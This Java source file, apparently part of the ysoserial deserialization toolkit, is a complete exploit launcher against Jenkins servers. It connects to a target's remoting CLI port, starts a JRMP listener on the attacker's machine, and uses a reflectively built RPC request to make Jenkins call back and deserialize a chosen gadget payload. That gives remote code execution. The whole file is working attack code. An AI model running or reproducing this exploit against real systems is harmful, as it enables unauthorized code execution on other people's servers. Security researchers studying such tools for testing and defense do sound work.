/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 23.01.2016 by mbechler
 */
package ysoserial;


import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.util.Random;

import hudson.remoting.Callable;
import hudson.remoting.Channel;
import ysoserial.payloads.JRMPClient;
import ysoserial.payloads.ObjectPayload;


/**
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "javadoc", "nls", "rawtypes"
} )
public class Jenkins2 {

    public static final void main ( final String[] args ) {
        if ( args.length < 4 ) {
            System.err.println(Jenkins.class.getName() + " <jenkins_url> <local_addr> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Class<? extends ObjectPayload> payloadClass = Jenkins.getPayloadClass(args[ 2 ]);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            System.err.println("Invalid payload type '" + args[ 2 ] + "'");
            System.exit(-1);
            return;
        }

        final Object payloadObject;
        try {
            final ObjectPayload payload = payloadClass.newInstance();
            payloadObject = payload.getObject(args[ 3 ]);
        }
        catch ( Exception e ) {
            System.err.println("Failed to construct payload");
            e.printStackTrace(System.err);
            System.exit(-1);
            return;
        }

        String myAddr = args[ 1 ];
        int jrmpPort = new Random().nextInt(65536 - 1024) + 1024;
        String jenkinsUrl = args[ 0 ];

        Thread t = null;
        Channel c = null;
        try {
            InetSocketAddress isa = Jenkins.getCliPort(jenkinsUrl);
            c = Jenkins.openChannel(isa);
            t = new Thread(new JRMPListener(jrmpPort, payloadObject), "ReverseDGC"); //$NON-NLS-1$
            t.setDaemon(true);
            t.start();

            Class<?> reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");
            Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
            reqCons.setAccessible(true);
            Object getJarLoader = reqCons
                    .newInstance(1, Class.forName("hudson.remoting.IChannel").getMethod("getProperty", Object.class), new Object[] {
                        new JRMPClient().getObject(myAddr + ":" + jrmpPort)
            });
            c.call((Callable<?, ?>) getJarLoader);
        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }
        finally {
            if ( c != null ) {
                try {
                    c.close();
                }
                catch ( IOException e ) {
                    e.printStackTrace(System.err);
                }
            }

            if ( t != null ) {
                t.interrupt();
                try {
                    t.join();
                }
                catch ( InterruptedException e ) {
                    e.printStackTrace(System.err);
                }
            }
        }
    }
}
